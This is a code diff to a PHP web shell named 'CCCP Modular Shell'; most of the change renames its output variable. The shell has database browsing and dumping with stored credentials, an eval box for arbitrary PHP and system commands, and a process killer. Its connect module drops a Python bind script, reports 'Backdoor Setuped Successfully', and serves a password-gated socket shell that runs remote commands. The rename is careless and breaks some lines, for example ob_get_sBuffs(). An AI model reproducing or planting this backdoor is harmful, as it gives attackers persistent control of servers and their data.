+							elseif($p['sqltype']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$rows."'";
+							elseif($p['sqltype']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$rows."'";
+							elseif($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
+							else $showtbl = 'SHOW TABLES FROM '.$rows; //mysql
 
-					$result = sql_query($sql['type'], $showdb, $con);
-					if($result !== false) {
-						$bg = 0;
-						while($rowarr = sql_fetch_data($sql['type'], $result)){
-							foreach($rowarr as $rows){
-								$content .= '<p class="notif ' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '" onclick=\'toggle("db_'.$rows.'")\'>'.$rows.'</p><div class="uiinfo" id="db_'.$rows.'"><table id="sort" class="explore">';
-
-								if($sql['type']==='mssql') $showtbl = 'SELECT name FROM '.$rows."..sysobjects WHERE xtype = 'U'";
-								elseif($sql['type']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$rows."'";
-								elseif($sql['type']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$rows."'";
-								elseif($sql['type']==='sqlite' || $sql['type']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
-								else $showtbl = 'SHOW TABLES FROM '.$rows; //mysql
-
-								$result_t = sql_query($sql['type'], $showtbl, $con);
-								if($result_t!=false) {
-									while($tablearr=sql_fetch_data($sql['type'], $result_t)){
-										foreach($tablearr as $tables){
-											if($sql['type']==='mssql') $dumptbl = 'SELECT TOP 100 * FROM '.$rows.'..'.$tables;
-											elseif($sql['type']==='pgsql') $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 100 OFFSET 0';
-											elseif($sql['type']==='oracle') $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' WHERE ROWNUM BETWEEN 0 AND 100;';
-											elseif($sql['type']==='sqlite' || $sql['type']==='sqlite3') $dumptbl = 'SELECT * FROM '.$tables.' LIMIT 0, 100';
-											else $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 0, 100'; //mysql
+							$res_t = sql_query($p['sqltype'], $showtbl, $con);
+							if ($res_t!=false) {
+								while($tablearr=sql_fetch_data($p['sqltype'], $res_t)){
+									foreach($tablearr as $tables){
+										if($p['sqltype']==='mssql') $dumptbl = 'SELECT TOP 100 * FROM '.$rows.'..'.$tables;
+										elseif($p['sqltype']==='pgsql') $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 100 OFFSET 0';
+										elseif($p['sqltype']==='oracle') $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' WHERE ROWNUM BETWEEN 0 AND 100;';
+										elseif($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $dumptbl = 'SELECT * FROM '.$tables.' LIMIT 0, 100';
+										else $dumptbl = 'SELECT * FROM '.$rows.'.'.$tables.' LIMIT 0, 100'; //mysql
 											
-											$content .= '<tr><td><a href="#" onclick="ajaxLoad(\'me=sql&sqlhost='.$sql['host'].'&sqlport='.$sql['port'].'&sqluser='.$sql['user'].'&sqlpass='.$sql['pass'].'&sqltype='.$sql['type'].'&sqlcode='.$dumptbl.'\')">'.$tables.'</a></td></tr>';
-										}
+										$sBuff .= '<tr><td><a href="#" onclick="dbexec(\'' . $dumptbl . '\');return false;">' . $tables . '</a></td></tr>';
 									}
 								}
-								$content .= '</table></div>';
 							}
+							$sBuff .= '</table></div>';
 						}
 					}
 				}
 			}
-				
-			sql_close($sql['type'], $con);
-		} else {
-			$content .= sDialog('Unable to connect to database');
-			$show_form = true;
-		}
-	}
 
-	if($show_form){
+			$sBuff .= '</td>
+				<td id="dbRes" style="vertical-align:top;width:100%;"></td>
+				</tr></tbody></table>';
+			
+			sql_close($p['sqltype'], $con);
+		} else
+			$sBuff .= sDialog('Unable to connect to database');
+	} else {
+		if (isset($_COOKIE['c'])) {
+			$delme = '';
+			if (isset($p['dc'])){
+				setcookie('c[' . $p['dc'] . ']', '', time() - $login);
+				$delme = $p['dc'];
+			}
+	
+			foreach($_COOKIE['c'] as $c => $d) {
+				if ($c == $delme) continue;
+				$dbcon = (function_exists('json_encode') && function_exists('json_decode')) ? json_decode($d) : unserialize($d);
+				foreach($dbcon as $k => $v) 
+					$sql[$k] = $v;
+				$sBuff .= sDialog('[' . strtoupper($sql['type']) . '] ' . $sql['user'] . '@' . $sql['host'] . '<span style="float:right;">' .
+					'<a href="#" onclick="ajaxLoad(\'me=sql&sqlhost=' . $sql['host'] . '&sqlport=' . $sql['port'] . '&sqluser=' . $sql['user'] . '&sqlpass=' . $sql['pass'] . '&sqltype=' . $sql['type'] . '\');">connect</a>' .
+					' | <a href="#" onclick="ajaxLoad(\'me=sql&dc=' . $c . '\')">disconnect</a></span>');
+			}
+		}
+	
 		$sqllist = '';
 		if (function_exists('mysql_connect') || function_exists('mysqli_connect')) $sqllist .= '<option value="mysql">MySQL [using mysql_* or mysqli_*]</option>';
 		if (function_exists('mssql_connect') || function_exists('sqlsrv_connect')) $sqllist .= '<option value="mssql">MsSQL [using mssql_* or sqlsrv_*]</option>';
@@ -1645,28 +1633,28 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 		if (function_exists('odbc_connect')) $sqllist .= '<option value="odbc">ODBC [using odbc_*]</option>';			
 		if (class_exists('PDO')) $sqllist .= '<option value="pdo">PDO [using class PDO]</option>';
 			
-		$content .= '<form>' .
-					'<table class="myboxtbl">' .
-					'<tr><td>Host/DSN/Connection String/DB File</td><td><input style="width:100%;" type="text" name="sqlhost" value="" /></td></tr>' .
-					'<tr><td>Username</td><td><input style="width:100%;" type="text" name="sqluser" value="" /></td></tr>' .
-					'<tr><td>Password</td><td><input style="width:100%;" type="password" name="sqlpass" value="" /></td></tr>' .
-					'<tr><td>Port (optional)</td><td><input style="width:100%;" type="text" name="sqlport" value="" /></td></tr>' .
-					'<tr><td>Engine</td><td><select name="sqltype">' . $sqllist . '</select></td></tr>' .
-					'</table>' .
-					mHide('me', 'sql') . mHide('sqlinit', 'init') .
-					mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]))') .
-					'</form>';
+		$sBuff .= '<form>' .
+			'<table class="myboxtbl">' .
+			'<tr><td><span id="sh">' . tText('sq7', 'Host') . '</span></td><td>' . mInput(array('n'=>'sqlhost', 'e'=>'style="width: 99%;"')) . '</td></tr>' .
+			'<tr id="su"><td>' . tText('sq0', 'Username') . '</td><td>' . mInput(array('n'=>'sqluser', 'e'=>'style="width: 99%;"')) . '</td></tr>' .
+			'<tr id="sp"><td>' . tText('sq1', 'Password') . '</td><td>' . mInput(array('n'=>'sqlpass', 'e'=>'style="width: 99%;"')) . '</td></tr>' .
+			'<tr id="so"><td>' . tText('sq2', 'Port (optional)') . '</td><td>' . mInput(array('n'=>'sqlport', 'e'=>'style="width: 99%;"')) . '</td></tr>' .
+			'<tr><td>' . tText('sq3', 'Engine') . '</td><td><select id="sqltype" name="sqltype" onchange="dbengine(this)">' . $sqllist . '</select></td></tr>' .
+			'</table>' .
+			mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.getElementById("sqltype"))') .
+			mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]))') .
+			'</form>';
 	}
 }
 
 if (isset($p['me']) && $p['me'] === 'connect') { //Basada en AniShell
     if (@sValid($p['ip']) && sValid($p['port'])) {
-        $content .= '<p>The Program is now trying to connect!</p>';
+        $sBuff .= '<p>The Program is now trying to connect!</p>';
         $ip = $p['ip'];
         $port = $p['port'];
         $sockfd = fsockopen($ip, $port, $errno, $errstr);
         if ($errno != 0) {
-            $content .= '<font color="red"><b>' . $errno . '</b>: ' . $errstr . '</font>';
+            $sBuff .= '<font color="red"><b>' . $errno . '</b>: ' . $errstr . '</font>';
         } else
             if (! $sockfd) {
                 $result = '<p>Fatal: An unexpected error was occured when trying to connect!</p>';
@@ -1708,13 +1696,13 @@ if (isset($p['me']) && $p['me'] === 'connect') { //Basada en AniShell
                     fwrite($fd, base64_decode($Python_CODE));
 
                     if ($isWIN) {
-                        $content .= '[+] OS Detected = Windows';
+                        $sBuff .= '[+] OS Detected = Windows';
                         execute('start bind.py');
 
                         $pattern = 'python.exe';
                         $list = execute('TASKLIST');
                     } else {
-                        $content .= '[+] OS Detected = Linux';
+                        $sBuff .= '[+] OS Detected = Linux';
                         execute('chmod +x bind.py ; ./bind.py');
 
                         // Check if the process is running
@@ -1724,12 +1712,12 @@ if (isset($p['me']) && $p['me'] === 'connect') { //Basada en AniShell
 
 
                     if (preg_match("/$pattern/", $list)) {
-                        $content .= '<p class="alert_green">Process Found Running! Backdoor Setuped Successfully</p>';
+                        $sBuff .= '<p class="alert_green">Process Found Running! Backdoor Setuped Successfully</p>';
                     } else {
-                        $content .= '<p class="alert_red">Process Not Found Running! Backdoor Setup FAILED</p>';
+                        $sBuff .= '<p class="alert_red">Process Not Found Running! Backdoor Setup FAILED</p>';
                     }
 
-                    $content .= "<br><br>
+                    $sBuff .= "<br><br>
 <b>Task List :-</b> <pre>
 $list</pre>";
 
@@ -1744,7 +1732,7 @@ $list</pre>";
 
                     // Bind the socket to an address/port
                     if (socket_bind($sockfd, $address, $port) == false) {
-                        $content .= "Cant Bind to the specified port and address!";
+                        $sBuff .= "Cant Bind to the specified port and address!";
                     }
 
                     // Start listening for connections
@@ -1772,13 +1760,13 @@ $list</pre>";
                             socket_write($client, '(Shell)[$]> ');
                             $cmd = socket_read($client, $maxCmdLen);
                             if ($cmd == false) {
-                                $content .= 'The client Closed the conection!';
+                                $sBuff .= 'The client Closed the conection!';
                                 break;
                             }
                             socket_write($client, execute($cmd));
                         }
                     } else {
-                        $content .= 'Wrong Password!';
+                        $sBuff .= 'Wrong Password!';
                         socket_write($client, "Wrong Password!
 
 ");
@@ -1791,10 +1779,10 @@ $list</pre>";
                     // Close the master sockets
                     //socket_close($sock);
                 } else {
-                    $content .= "Socket Conections not Allowed/Supported by the server!";
+                    $sBuff .= "Socket Conections not Allowed/Supported by the server!";
                 }
             } else {
-                $content .= '
+                $sBuff .= '
       <table class="bind" align="center" >
       <tr>
          <th class="header" colspan="1" width="50px">Back Connect</th>
@@ -1859,7 +1847,7 @@ $list</pre>";
 }
 
 if (isset($p['me']) && $p['me'] === 'execute') {
-    $content .= '<h2>' . tText('ev0', 'Eval/Execute') . '</h2>';
+    $sBuff .= '<h2>' . tText('ev0', 'Eval/Execute') . '</h2>';
     $code = @trim($p['c']);
     if ($code) {
 		if (isset($p['e'])) {
@@ -1868,35 +1856,35 @@ if (isset($p['me']) && $p['me'] === 'execute') {
 			putenv('LC_ALL='.$locale);*/
 			$buf = htmlspecialchars(execute($code));
 			if (isset($p['dta'])) 
-				$content .= '<br><textarea class="bigarea" readonly>' . $buf . '</textarea>';
+				$sBuff .= '<br><textarea class="bigarea" readonly>' . $buf . '</textarea>';
 			else 
-				$content .= $buf . '<br><pre></pre>';
+				$sBuff .= $buf . '<br><pre></pre>';
 		} else {
 			if (!preg_match('#<\?#si', $code)) 
 				$code = "<?php\n\n{$code}\n\n?>";
 
 			//hago esta chapuzada para que no se muestre el resultado arriba
 			echo 'Result of the executed code:';
-			$buf = ob_get_contents();
+			$buf = ob_get_sBuffs();
 
 			if ($buf) {
 				ob_clean();
 				eval("?" . ">$code");
-				$ret = ob_get_contents();
+				$ret = ob_get_sBuffs();
 				$ret = convert_cyr_string($ret, 'd', 'w');
 				ob_clean();
-				$content .= $buf;
+				$sBuff .= $buf;
 				
 				if (isset($p['dta'])) 
-					$content .= '<br><textarea class="bigarea" readonly>' . htmlspecialchars($ret) . '</textarea>';
+					$sBuff .= '<br><textarea class="bigarea" readonly>' . htmlspecialchars($ret) . '</textarea>';
 				else 
-					$content .= $ret . '<br><pre></pre>';
+					$sBuff .= $ret . '<br><pre></pre>';
 			} else
 				eval("?" . ">$code");
         }
     }
 
-    $content .= '<form>
+    $sBuff .= '<form>
 	<textarea class="bigarea" name="c">' . (isset($p['c']) ? htmlspecialchars($p['c']) : '') . '</textarea></p>
 	<p>' . tText('ev1', 'Display in text-area') . ': <input type="checkbox" name="dta" value="1" ' . (isset($p['dta']) ? 'checked' : '') . '>&nbsp;&nbsp;
 	' . tText('execute', 'Execute') . ': <input type="checkbox" name="e" value="1" ' . (isset($p['e']) ? 'checked' : '') . '>&nbsp;&nbsp;
@@ -1949,9 +1937,9 @@ if (isset($p['me']) && $p['me'] === 'info') {
         31 => array('bzcompress', getfun('bzcompress')),
     );
 
-    if (@sValid($p['phpvarname'])) $content .= sDialog($p['phpvarname'] . ': ' . getcfg($p['phpvarname']));
+    if (@sValid($p['phpvarname'])) $sBuff .= sDialog($p['phpvarname'] . ': ' . getcfg($p['phpvarname']));
 
-    $content .= '<form> 
+    $sBuff .= '<form> 
         <h2>Variables del servidor</h2> 
         <p>Ingrese los parametros PHP de configuracion (ej: magic_quotes_gpc)
         <input name="phpvarname" id="phpvarname" value="" type="text" size="100" /> <input name="submit" id="submit" type="submit" value="Submit"></p> 
@@ -1959,22 +1947,22 @@ if (isset($p['me']) && $p['me'] === 'info') {
 
     $hp = array(0 => 'Server', 1 => 'PHP', 2 => 'Extras');
     for ($a = 0; $a < 3; $a++) {
-        $content .= '<h2>' . $hp[$a] . '</h2><ul>';
+        $sBuff .= '<h2>' . $hp[$a] . '</h2><ul>';
         if ($a == 0) {
             for ($i = 1; $i <= 9; $i++) {
-                $content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
+                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
             }
         } elseif ($a == 1) {
             for ($i = 10; $i <= 23; $i++) {
-                $content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
+                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
             }
         } elseif ($a == 2) {
             for ($i = 24; $i <= 31; $i++) {
-                $content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
+                $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
             }
         }
 
-        $content .= '</ul>';
+        $sBuff .= '</ul>';
     }
 }
 
@@ -1982,10 +1970,10 @@ if (isset($p['me']) && $p['me'] === 'process') {
 	if (isset($p['ps'])) {
         for ($i = 0; count($p['ps']) > $i; $i++) {
 			if (function_exists('posix_kill')) 
-				$content .= sDialog((posix_kill($p['ps'][$i], '9') ? 'Process with pid ' . $p['ps'][$i] . ' has been successfully killed' : 'Unable to kill process with pid ' . $p['ps'][$i]));
+				$sBuff .= sDialog((posix_kill($p['ps'][$i], '9') ? 'Process with pid ' . $p['ps'][$i] . ' has been successfully killed' : 'Unable to kill process with pid ' . $p['ps'][$i]));
 			else {
-				if($isWIN) $content .= sDialog(execute('taskkill /F /PID ' . $p['ps'][$i]));
-				else $content .= sDialog(execute('kill -9 ' . $p['ps'][$i]));
+				if($isWIN) $sBuff .= sDialog(execute('taskkill /F /PID ' . $p['ps'][$i]));
+				else $sBuff .= sDialog(execute('kill -9 ' . $p['ps'][$i]));
 			}
 		}
 	}
@@ -1998,7 +1986,7 @@ if (isset($p['me']) && $p['me'] === 'process') {
 	}
 
 	$res = execute($h);
-	if (trim($res) === '') $content = sDialog('Error getting process list');
+	if (trim($res) === '') $sBuff = sDialog('Error getting process list');
 	else {
 		if(!$isWIN) $res = preg_replace('#\ +#', ' ', $res);
 		$psarr = explode("
@@ -2007,38 +1995,38 @@ if (isset($p['me']) && $p['me'] === 'process') {
 		$tblcount = 0;
 		$wcount = count(explode($wexp, $psarr[0]));
 
-		$content .= '<br><form method="post" action="" name="ps"><table class="explore sortable">';
+		$sBuff .= '<br><form method="post" action="" name="ps"><table class="explore sortable">';
 		foreach($psarr as $psa){
 			if(trim($psa) !== ''){
 				if($fi){
 					$fi = false;
 					$psln = explode($wexp, $psa, $wcount);
-					$content .= '<tr><th style="width:24px;" class="sorttable_nosort"></th><th class="sorttable_nosort">action</th>';
-					foreach($psln as $p) $content .= '<th>' . trim(trim($p), '"') . '</th>';
-					$content .= '</tr>';
+					$sBuff .= '<tr><th style="width:24px;" class="sorttable_nosort"></th><th class="sorttable_nosort">action</th>';
+					foreach($psln as $p) $sBuff .= '<th>' . trim(trim($p), '"') . '</th>';
+					$sBuff .= '</tr>';
 				} else {
 					$psln = explode($wexp, $psa, $wcount);
-					$content .= '<tr>';
+					$sBuff .= '<tr>';
 					$tblcount = 0;
 					foreach($psln as $p){
 						$pid = trim(trim($psln[1]), '"');
 						if(trim($p) === '') $p = '&nbsp;';
 						if($tblcount == 0){
-							$content .= '<td style="text-align:center;text-indent:4px;"><input id="ps" name="ps[]" value="' . $pid . '" type="checkbox" onchange="hilite(this);" /></td><td style="text-align:center;"><a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) ajaxLoad(\'me=procs&ps[]=' . $pid . '\')">kill</a></td>
+							$sBuff .= '<td style="text-align:center;text-indent:4px;"><input id="ps" name="ps[]" value="' . $pid . '" type="checkbox" onchange="hilite(this);" /></td><td style="text-align:center;"><a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) ajaxLoad(\'me=procs&ps[]=' . $pid . '\')">kill</a></td>
 									<td style="text-align:center;">' . trim(trim($p), '"') . '</td>';
 							$tblcount++;
 						} else {
 							$tblcount++;
-							if($tblcount == count($psln)) $content .= "<td style='text-align:left;'>".trim(trim($p), '"')."</td>";
-							else $content .= "<td style='text-align:center;'>".trim(trim($p), '"')."</td>";
+							if($tblcount == count($psln)) $sBuff .= "<td style='text-align:left;'>".trim(trim($p), '"')."</td>";
+							else $sBuff .= "<td style='text-align:center;'>".trim(trim($p), '"')."</td>";
 						}
 					}
-					$content .= '</tr>';
+					$sBuff .= '</tr>';
 				}
 			}
 		}
 		
-		$content .= '<tfoot><tr><td>
+		$sBuff .= '<tfoot><tr><td>
 		<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />	
 		</td><td style="text-indent:10px;padding:2px;" colspan="' . (count($psln)+1) . '"><input name="submit" id="submit" type="submit" value="kill selected">
 		<span id="total_selected"></span></a></td>
@@ -2048,15 +2036,15 @@ if (isset($p['me']) && $p['me'] === 'process') {
 
 #Se fini
 if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest')
-	exit($content . mHide('etime', substr((microtime(true) - $tiempoCarga), 0, 4)));
+	exit($sBuff . mHide('etime', substr((microtime(true) - $tiempoCarga), 0, 4)));
 ?>
 	<!DOCTYPE html>
 	<html>
 	<head>
-	  <meta http-equiv=Content-Type content="text/html; charset=iso-8859-1">
-	  <meta http-equiv=Pragma content=no-cache>
-	  <meta http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT">
-	  <meta name="robots" content="noindex, nofollow, noarchive" />
+	  <meta http-equiv=sBuff-Type sBuff="text/html; charset=iso-8859-1">
+	  <meta http-equiv=Pragma sBuff=no-cache>
+	  <meta http-equiv=Expires sBuff="wed, 26 Feb 1997 08:21:57 GMT">
+	  <meta name="robots" sBuff="noindex, nofollow, noarchive" />
 	  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAA+AIGAv8IHAn/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkhC/8FEQb/AAEA9wABAPsHGgj/IHUm/yeOLv8njS7/J40u/yeOLv8nji7/J40u/yaMLf8njS7/J44u/yeNLv8miy3/FEYX/wEDAfsAAQD7CB4K/yWGK/8sojX/LKE0/y2iNf8rnDL/I4Iq/x1nIv8aXh7/HWki/yWEKv8rnTP/LJ80/xZQGv8BAwH7AAEA+wgeCv8lhSv/LKE1/yyhNP8okS//FlAa/wccCf8DCgP/AQUC/wMLA/8IHgn/F1Uc/yiRMP8WUBr/AQMB+wABAPsIHgr/JYUr/yyhNf8pljH/FEkX/wMLA/8AAAb/AAAV/wAAC/8AAAD/AAAA/wQQBf8bYyD/FlAa/wEDAfsAAQD7CB4K/yWFK/8sojT/HWki/wQQBf8AAAb/AABS/wAAnv8AAGT/AAAN/wAAAP8DDAT/Gl4e/xZQGv8BAwH7AAEA+wgeCv8lhiz/KZcx/w84Ev8BAgH/AAAk/wAAu/8AAOL/AAB2/wAADf8DCQP/E0UW/yeOLv8WUBr/AQMB+wABAPsIHgr/JYcs/ySFK/8IHgr/AAAA/wAALf8AAI3/AABe/wABFP8FEAb/FUwY/yiSL/8rnjP/FlAa/wEDAfsAAQD7CB4K/yWGK/8fdCX/BA8E/wAAAP8AAAf/AAAQ/wEFBv8JIgv/G2Qh/yqXMf8soTT/K50z/xZQGv8BAwH7AAEA+wgeCv8lhSv/HGci/wIIA/8AAQD/AgYC/wcZCf8USRj/I4Iq/yueM/8soTT/LKA0/yudM/8WUBr/AQMB+wABAPsIHgr/JYQr/xxnIf8GGAj/CycN/xVLGP8ieyj/Kpoy/yygNP8soDT/LKA0/yygNP8rnTP/FlAa/wEDAfsAAQD7CB4K/yWFK/8miy7/IHcm/yeNLf8snTP/LaI1/yyhNP8soDT/LKA0/yygNP8soDT/K50z/xZQGv8BAwH7AAEA+wYZCP8ebSP/JIQr/ySEK/8khCv/JIQr/ySDK/8kgyv/JIMr/ySDK/8kgyv/JIMr/yOBKv8SQhX/AQMB+wABAPsBBAH/BRIG/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFQf/AwsE/wABAPsAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAA==" />
 	  <title>CCCP Modular Shell</title>  
 	  <script type="text/javascript">
@@ -2097,12 +2085,9 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		if (o) o.parentNode.removeChild(o);
 	}
 
-	function empty() {
-		o = d.getElementById("content");
-		if (o) {
-			o.innerHTML = null;
-			d.getElementById("uetime").innerHTML = null;
-		}
+	function empty(e) {
+		o = d.getElementById(e);
+		if (o) o.innerHTML = null;
 	}
 	
 	function serialize(form) {
@@ -2176,22 +2161,22 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 			req.onreadystatechange = ao.bindFunction(ao.stateChange, ao);
 			req.open("POST", targeturl, true);
 			req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
-			req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+			req.setRequestHeader('content-Type', 'application/x-www-form-urlencoded');
 			req.setRequestHeader('Connection', 'close');
 			req.send(p);
 		}
 		return ao;
 	}
 
-	function html_safe(str){
-		if(typeof(str) == "string"){
-			str = str.replace(/&/g, "&amp;");
-			str = str.replace(/"/g, "&quot;");
-			str = str.replace(/'/g, "&#039;");
-			str = str.replace(/</g, "&lt;");
-			str = str.replace(/>/g, "&gt;");
+	function htmlsafe(s){
+		if(typeof(s) == "string"){
+			s = s.replace(/&/g, "&amp;");
+			s = s.replace(/"/g, "&quot;");
+			s = s.replace(/'/g, "&#039;");
+			s = s.replace(/</g, "&lt;");
+			s = s.replace(/>/g, "&gt;");
 		}
-		return str;
+		return s;
 	}
 
 	function dpath(e, t){
@@ -2271,17 +2256,23 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	}
 
 	function ajaxLoad(p){
-		empty();
+		empty("content");
 		append("content", "<div class='loading'></div>");
 		ajax(p, function(r){
-			empty();
+			empty("content");
 			append("content", r);
-			o = d.getElementById("sort");
-			if (o) sorttable.k(o);
-			o = d.getElementById("etime");
-			if (o) append("uetime", o.value);
+			updateui();
 			lastLoad = p;
 		});
+	}
+	
+	function updateui(){
+		o = d.getElementById("jseval");
+		if (o) eval(o.value);
+		o = d.getElementById("sort");
+		if (o) sorttable.k(o);
+		o = d.getElementById("etime");
+		if (o) d.getElementById("uetime").innerHTML = o.value;
 	}
 	
 	function viewSize(f){
@@ -2388,6 +2379,35 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 			//remove("uires");
 			appendr("content", "<div id='uires' class='uires'><?php echo tText('sres', 'Shell response'); ?>: " + r + "</div>");
 		});
+	}
+
+	function dbexec(c) {
+		empty("dbRes");
+		append("dbRes", "<div class='loading'></div>");
+		ajax(serialize(d.forms[0]) + '&sqlcode=' + c, function(r){
+			empty("dbRes");
+			append("dbRes", r);
+			updateui();
+		});
+	}	
+	
+	function dbengine(t) {
+		d.getElementById("su").className = "hide";
+		d.getElementById("sp").className = "hide";
+		d.getElementById("so").className = "hide";
+		
+		if ((t.value === "odbc") || (t.value === "pdo")) {
+			d.getElementById("sh").innerHTML = "<?php echo tText('sq5', 'DSN/Connection String'); ?>";
+			d.getElementById("su").className = "";
+			d.getElementById("sp").className = "";
+		} else if ((t.value === "sqlite") || (t.value === "sqlite3")) {
+			d.getElementById("sh").innerHTML = "<?php echo tText('sq6', 'DB File'); ?>";
+		} else {
+			d.getElementById("sh").innerHTML = "<?php echo tText('sq7', 'Host'); ?>";
+			d.getElementById("su").className = "";
+			d.getElementById("sp").className = "";
+			d.getElementById("so").className = "";
+		}
 	}
 	
 	function CheckAll(form) {
@@ -2551,7 +2571,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		.boxtitle a, .boxtitle a:hover{
 			color:#aaa;
 		}
-		.boxcontent{
+		.boxsBuff{
 			padding:2px 0 2px 0;
 		}
 		.boxresult{
@@ -2613,6 +2633,8 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 			width:100%;
 		}
 		.loading {
+			margin-left: auto;
+			margin-right: auto;
 			background-color: rgba(0,0,0,0);
 			border: 5px solid #800;
 			opacity: .9;
